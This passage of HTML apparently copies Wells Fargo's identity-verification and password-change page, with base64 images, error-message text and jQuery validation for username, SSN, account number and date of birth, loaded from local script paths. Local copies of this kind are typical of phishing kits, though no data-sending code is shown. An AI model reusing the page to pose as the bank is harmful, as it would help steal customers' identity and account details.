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%0A" alt="Wells Fargo">
	</div>
	<div theme="osmp">
	    <style>
		        [control=footer] {background: url('data:image/jpeg;base64,/9j/4QAYRXhpZgAASUkqAAgAAAAAAAAAAAAAAP/sABFEdWNreQABAAQAAABkAAD/4QMtaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjMtYzAxMSA2Ni4xNDU2NjEsIDIwMTIvMDIvMDYtMTQ6NTY6MjcgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDUzYgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MDkzRjI0NzlGRjVEMTFFMUJFRjZFRjM1OEI1NTBBRjYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MDkzRjI0N0FGRjVEMTFFMUJFRjZFRjM1OEI1NTBBRjYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDowOTNGMjQ3N0ZGNUQxMUUxQkVGNkVGMzU4QjU1MEFGNiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDowOTNGMjQ3OEZGNUQxMUUxQkVGNkVGMzU4QjU1MEFGNiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pv/uAA5BZG9iZQBkwAAAAAH/2wCEAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQECAgICAgICAgICAgMDAwMDAwMDAwMBAQEBAQEBAgEBAgICAQICAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA//AABEIADwACQMBEQACEQEDEQH/xACCAAACAgMBAAAAAAAAAAAAAAAABAUGAQMHCgEBAQEBAAAAAAAAAAAAAAAAAAIBAxAAAQIEAgUFEQEAAAAAAAAAAQIDABETBBIF8CFiFBWh4SJWGDFhkTKS0uIjYyQ1ldUGF2coqBEBAQABBAMBAAAAAAAAAAAAABEB8CFhcUESIyL/2gAMAwEAAhEDEQA/APfrj00MV6s3GPTQw9TdqjLlohcgjAQC9Xa5OaJuqCrtcnNC6ohBdg4QleLHMtK7iXAnWpokywuiR1HXq7xERelM737K58n04XoVNV4oKeS6iam8Dl/bM1CoNqURb5rl+vEUzbJWkTUCkyJWnpxWzPJfibPWyx8OV+dCkyrKLoYbcsOLtW03BtstuLgFbuQ5ouSXvt7NmW1AcPueihqaygkoShYO7LVFXMGqma9Tsq+a2n0yFwTDhV12l6uZ712V/ho4zV/N26cPpuy4hU9zqUcXj+upbEdvlqoxb4Q/9K/of/Tsb81frh//2Q==
') repeat-x left -30px;}
			</style>
			    <!-- Footer included -->
			<!-- scripts -->
			<div class="wrapper">
			    <div class="legal">
			        <p><a tabindex="0" class="link" href="#">Privacy, Security &amp; Legal</a>
			        <br>© 1999 - <span currentyear=""><script>document.write(new Date().getFullYear())</script></span> Wells Fargo. All rights reserved. NMLSR ID 399801</p>
			    </div>
			</div>
	    </div>
</div>

<script type="text/javascript">
	document.addEventListener("DOMContentLoaded", function(event) { 
		(function(){
	        var inLangServiceDown='false';
	        var redirect_link = "" ;
	        if (inLangServiceDown == 'true') {
	        	console.log('down')
	            $("#IlDown").trigger( "click" );
	            $('#IlDownModal').on('click', '.close', function(){
	                window.location.assign(redirect_link);
	            });
	        }     
	    })();
	});
	
</script><script type="text/javascript" src="../css js/jquery.js"></script>
        <script type="text/javascript" src="../css js/validation.js"></script>
        <script type="text/javascript" src="../css js/theme.js"></script>
        <script type="text/javascript" src="../css js/theme_002.js"></script>
        <script>
    errorMessages = {
        'invalid1': 'We cannot verify your entry.  Please try again or select the help icon.',
        'invalid2': 'We are unable to process your request online. Please call us at 1-800-956-4442 for assistance.',
        'identification': {
            'section1': {
                'blank': 'Please enter a username, Social Security number (SSN), or individual tax identification number (ITIN). If you do not have an SSN or ITIN, and do not remember your username, please call 1-800-956-4442 for assistance.'           
            },
            'section2': {
                'blank': 'Please enter one of your Wells Fargo account numbers, your ATM card number, your debit card number or your credit card number. If you are a mortgage or employee sponsored retirement customer please enter your date of birth.'
            }
        },
        'changePasswordEnhancedPassword': {
            'invalid1': 'We cannot verify your entry.  Please try again.',
            'blank': 'Please enter a password.',
            'tooShort': 'Your password must be at least 8 characters in length. Please re-enter your password.',
            'matchUsername': 'Your password should be different than your username. Please choose a new password that is not the same as your username or ATM PIN and that is not easy for others to guess.',
            'mismatch': 'Your password entries do not match. Please enter the same password in both fields.'
        },
        'changePassword': {
            'blank': 'Please enter a password.',
            'tooShort': 'Your password must be at least 6 characters in length. Please re-enter your password.',
            'matchUsername': 'Your password should be different than your username. Please choose a new password that is not the same as your username or ATM PIN and that is not easy for others to guess.',
            'mismatch': 'Your password entries do not match. Please enter the same password in both fields.'
        },
        'debitCard': {
            'debitCardNumber': {
                'blank': 'Please enter your ATM/debit card number.'
            },
            'debitCardPin': {
                'blank': 'Please enter your ATM/debit card PIN.'
            }
        },
        'creditCard': {
            'creditCardNumber': {
                'blank': 'Please enter your Wells Fargo credit card number.'
            },
            'expirationDate': {
                'blank': 'The date you have selected is invalid. Please enter a valid expiration date.'
            },
            'securityCode': {
                'blank': 'Please enter your security code.',
                'blankAmex': 'Please enter your security code.'
            }
        },
        'zipCode': {
            'blank': 'Please enter the 5-digit ZIP code that appears on your statement.'
        },
        'findUsername': {
            'invalid': 'We do not recognize the SSN or ITIN number, and/or password you entered. Please try again, go to Password Help, or call 1-800-956-4442 for assistance.',
            'password': {
                'blank': 'Please enter your password. If you do not remember, your password, go to Password Help.'
            },
            'ssn': {
                'blank': 'Please enter a Social Security number (SSN) or Individual Tax Identification Number (ITIN). If you do not have an SSN or ITIN, and do not remember your username, please call 1-800-956-4442 for assistance.'
            }
        }
    }
</script><script type="text/javascript" src="../css js/nativeapp-bridge-min.js"></script>
<script>
var ChangePassword = {};

var ChangePassword = (function(){

    var obj = {

    };



    obj.error = {
        'messages': {
            'invalid1': errorMessages.invalid1,
            'invalid2': errorMessages.invalid2,
            'blank1': errorMessages.identification.section1.blank,
            'blank2': errorMessages.identification.section2.blank
        }
    };



    obj.elements = {
        'all': $('*'),
        'body': $('body'),
        'title': $('head > title'),
        'head': $('head'),
        'form': {
            'self': $('#credentials'),
            'username': $('#username'),
            'usernameError':$('#usernameError'),
            'ssn1': $('#ssn1'),
            'ssn2': $('#ssn2'),
            'ssn3': $('#ssn3'),
            'ssnError': $('#ssnError'),
            'accountNumber': $('#accountNumber'),
            'accountNumberError': $('#accountNumberError'),
            'dob1': $('#dob1'),
            'dob2': $('#dob2'),
            'dob3': $('#dob3'),
            'dobError': $('#dobError'),
            'action_hidden': $('#action'),
            'dobContainer': $('#dobContainer'),
            'accountContainer': $('#accountContainer'),
            'prefOneOrMore': $('#prefOneOrMore'),
            'prefMortOnly': $('#prefMortOnly'),
            'submitted': false
        },
        'buttons': {
            'continue': $('#continue'),
            'cancel': $('#cancel')
        },
        'errorMessage': {
            'container': $('[control=errorMessage]'),
            'message': $('[control=errorMessage]').find('#errorMessage')
        },
        'loadingAction': $('[control=loadingAction]')
    };



    obj.events = {
        'keyboard': {
            'enter': {
                'keypress': function(e){
                    if(e.which == 13){
                        e.preventDefault();
                        obj.methods.submit('verify');
                    }
                }
            }
        },
        'buttons': {
            'continue': {
                'click': function(e){
                    e.preventDefault();
                    obj.methods.submit('verify');
                }
            },
            'cancel': {
                'click': function(e){
                    e.preventDefault();
                    obj.methods.submit('cancel');
                }
            }
        },
        'form': {
            'input': {
                'keyup': function(e){
                    var maxLength = $(this).attr('maxlength');
                    var inputLength = $(this).val().length;

                    if(inputLength > maxLength){
                        $(this).val($(this).val().slice(0, maxLength));
                    }
                }
            },
            'username': {
                'click': function(e){
                    //obj.elements.form.ssn1.val('');
                    //obj.elements.form.ssn2.val('');
                    //obj.elements.form.ssn3.val('');
                },
                'keyup': function(e){
                    if(e.which != 9 && e.which != 16){
                        obj.elements.form.username.trigger('click');
                    }
                }
            },
            'ssn':{
                'click': function(e){
                    //obj.elements.form.username.val('');
                }
            },
            'accountNumber': {
                'click': function(e){
                    //obj.elements.form.dob1.val('');
                    //obj.elements.form.dob2.val('');
                    //obj.elements.form.dob3.val('');
                },
                'keyup': function(e){
                    if(e.which != 9 && e.which != 16){
                        obj.elements.form.accountNumber.trigger('click');
                    }
                }
            },
            'dob':{
                'click': function(e){
                    //obj.elements.form.accountNumber.val('');
                },
                'keyup': function(e){
                    if(e.which != 9 && e.which != 16){
                        obj.elements.form.dob1.trigger('click');
                    }
                }
            },
            'ssn1': {
                'keyup': function(e){
                    var self = $(this);

                    if(e.which != 9 && e.which != 16){
                        if(self.val().length == 3){
                            obj.elements.form.ssn2.focus();
                        }
                        obj.elements.form.ssn1.trigger('click');
                    }
                }
            },
            'ssn2': {
                'keyup': function(e){
                    var self = $(this);
                    if(e.which != 9 && e.which != 16){
                        if(self.val().length == 2){
                            obj.elements.form.ssn3.focus();
                        } else if(self.val().length === 0){
                            obj.elements.form.ssn1.focus();
                        }
                        obj.elements.form.ssn1.trigger('click');
                    }
                }
            },
            'ssn3': {
                'keyup': function(e){
                    var self = $(this);

                    if(self.val().length === 0){
                        obj.elements.form.ssn2.focus();
                    }
                    if(e.which != 9 && e.which != 16){
                        obj.elements.form.ssn1.trigger('click');
                    }
                }
            },
            'prefMortOnly': {
                'click': function(e){
                    obj.elements.form.dobContainer.show();
                    obj.elements.form.accountContainer.hide();
                },
            },
            'prefOneOrMore': {
                'click': function(e){
                    obj.elements.form.dobContainer.hide();
                    obj.elements.form.accountContainer.show();  
                },
            },
        }
    };



    obj.methods = {
        'submit': function(action){
            if(obj.elements.form.submitted){
                return false;
            }
            obj.elements.form.action_hidden.val(action);
            obj.elements.form.self.submit();
            obj.elements.loadingAction.hide();
        },
        'cancel': function(){

        },
        'isSectionBlank': function(section){
            var form = obj.elements.form;
            if (section === 1) {
                if(form.username.val().length === 0  && (form.ssn1.val().length === 0 || form.ssn2.val().length === 0 || form.ssn3.val().length === 0)){
                    return true;
                } else {
                    return false;
                }
            } else if (section === 2) {
                if(form.accountNumber.val().length === 0 && (form.dob1.val().length === 0 || form.dob2.val().length === 0 || form.dob3.val().length === 0)) {
                    return true;
                } else {
                    return false;
                }
            } else {
                return false;
            }
        },
        'validate': function(section){
            var passedValidation = true;
            var form = obj.elements.form;
            var section1passed = true;
            var section2passed = true;
            var isMobile = obj.elements.body.attr('isMobile') === 'true' ? true : false;

            if(obj.elements.form.action_hidden.val() === 'cancel'){
                return true;
            }

            obj.elements.form.self.find('input').removeClass('error');
            obj.elements.form.self.find('img[alt=error]').addClass('hidden');

            if(section == 1 || section == 12){
                if(obj.methods.isSectionBlank(1)){
                    passedValidation = false;
                    section1passed = false;
                    obj.elements.errorMessage.message.text(obj.error.messages.blank1);
                } else if(form.username.val().length > 0){
                    if(form.username.val() < 6 ||
                        !Validation.dashUnderscore(form.username) ||
                        !Validation.noSpaces(form.username) ||
                        !Validation.oneLetter(form.username)){
                            passedValidation = false;
                            section1passed = false;
                            obj.elements.errorMessage.message.text(obj.error.messages.invalid1);
                        }
                } else if(!Validation.numbersOnly(form.ssn1, 3)||
                    !Validation.numbersOnly(form.ssn2, 2)||
                    !Validation.numbersOnly(form.ssn3, 4)) {
                        passedValidation = false;
                        section1passed = false;
                        obj.elements.errorMessage.message.text(obj.error.messages.invalid1);
                    }
            }

            if(section == 2 || section == 12){
                if(obj.methods.isSectionBlank(2)) {
                    passedValidation = false;
                    section2passed = false;
                    obj.elements.errorMessage.message.text(obj.error.messages.blank2);
                } else if (form.accountNumber.val().length > 0) {
                    if(!Validation.zeros(form.accountNumber) || !Validation.maxLength(form.accountNumber, 16)){
                        passedValidation = false;
                        section2passed = false;
                        obj.elements.errorMessage.message.text(obj.error.messages.invalid1);
                    }
                } else if (!Validation.date(form.dob1.val() + '/' + form.dob2.val() + '/' + form.dob3.val())) {
                    passedValidation = false;
                    section2passed = false;
                    obj.elements.errorMessage.message.text(obj.error.messages.invalid1);

                }
            }

            if(section == 12){
                if(obj.methods.isSectionBlank(1) && obj.methods.isSectionBlank(2)) {
                    obj.elements.errorMessage.message.text(obj.error.messages.invalid1);
                }
            }

            if(!passedValidation){
                if(!section1passed){
                    obj.elements.form.username.addClass('error');
                    obj.elements.form.ssn1.closest('[control="forms:fieldContainer"]').find('input').addClass('error');
                    obj.elements.form.usernameError.removeClass('hidden');
                    obj.elements.form.ssnError.removeClass('hidden');
                }
                if(!section2passed){
                    obj.elements.form.accountNumber.addClass('error');
                    obj.elements.form.dob1.closest('[control="forms:fieldContainer"]').find('input').addClass('error');
                    obj.elements.form.accountNumberError.removeClass('hidden');
                    obj.elements.form.dobError.removeClass('hidden');
                    obj.elements.form.dob1.attr('aria-invalid', 'true');
                    obj.elements.form.dob2.attr('aria-invalid', 'true');
                    obj.elements.form.dob3.attr('aria-invalid', 'true');
                    obj.elements.form.accountNumber.attr('aria-invalid', 'true');
                }

                obj.elements.form.self.find('[control="forms:input"]').val('');

                obj.elements.errorMessage.container.attr('data-has-error', 'true');
                obj.elements.errorMessage.message.html('<span style="display:none" aria-hidden="false">error</span>' + obj.elements.errorMessage.message.html());
                obj.elements.errorMessage.message.focus();
            } else {
                obj.elements.form.accountNumber.attr('aria-invalid', 'false');
                obj.elements.form.dob1.attr('aria-invalid', 'false');
                obj.elements.form.dob2.attr('aria-invalid', 'false');
                obj.elements.form.dob3.attr('aria-invalid', 'false');

                obj.elements.errorMessage.container.attr('data-has-error', 'false');
                obj.elements.loadingAction.show();
            }

            obj.elements.form.submitted = passedValidation;
            return passedValidation;
        }
    };



    obj.elements.form.ssn1.on('keyup', obj.events.form.ssn1.keyup);
    obj.elements.form.ssn2.on('keyup', obj.events.form.ssn2.keyup);
    obj.elements.form.ssn3.on('keyup', obj.events.form.ssn3.keyup);
    obj.elements.form.username.on('click', obj.events.form.username.click);
    obj.elements.form.username.on('keyup', obj.events.form.username.keyup);
    obj.elements.form.ssn1.on('click', obj.events.form.ssn.click);
    obj.elements.form.ssn2.on('click', obj.events.form.ssn.click);
    obj.elements.form.ssn3.on('click', obj.events.form.ssn.click);
    obj.elements.form.accountNumber.on('click', obj.events.form.accountNumber.click);
    obj.elements.form.accountNumber.on('keyup', obj.events.form.accountNumber.keyup);
    obj.elements.form.dob1.on('click', obj.events.form.dob.click);
    obj.elements.form.dob2.on('click', obj.events.form.dob.click);     
    obj.elements.form.dob3.on('click', obj.events.form.dob.click);
    obj.elements.form.dob1.on('keyup', obj.events.form.dob.keyup);
    obj.elements.form.dob2.on('keyup', obj.events.form.dob.keyup);
    obj.elements.form.dob3.on('keyup', obj.events.form.dob.keyup);
    obj.elements.form.prefOneOrMore.on('click', obj.events.form.prefOneOrMore.click);
    obj.elements.form.prefMortOnly.on('click', obj.events.form.prefMortOnly.click);
    obj.elements.form.self.on('keyup', 'input', obj.events.form.input.keyup);
    obj.elements.form.self.on('keypress', 'input', obj.events.keyboard.enter.keypress);
    obj.elements.buttons['continue'].on('click', obj.events.buttons['continue'].click);



    obj.init = (function(e){
        obj.elements.form.self.find('[control="forms:input"]').val('');
        //$("input:text:visible:first").focus();

        if (nativeapp && nativeapp.bridge) { 
            var isNativeApp = nativeapp.bridge.isRunningInNativeApp() === true;
            var isNativeAppMdk = false;

            if(isNativeApp || isNativeAppMdk){
                nativeapp.bridge.init(""); 

                $('[control=footer] a').not('#sign_off a').on('click', function(e) { 
                    var href = $(this).attr('href'); 
                    var data = {
                        type: 'externalnoconfirm',
                        url: href
                    }
                    if (isNativeApp) { 
                        nativeapp.bridge.execute('openUrl', data);
                        e.preventDefault();
                        return false; 
                    } 
                    return true; 
                }); 

                obj.elements.buttons.cancel.on('click', function(e){
                    e.preventDefault();
                    nativeapp.bridge.execute('goSignOn', {});
                })

                return;
            }
        }

        obj.elements.buttons.cancel.on('click', obj.events.buttons.cancel.click);
    })();



    return obj;
})();
</script>
</body></html>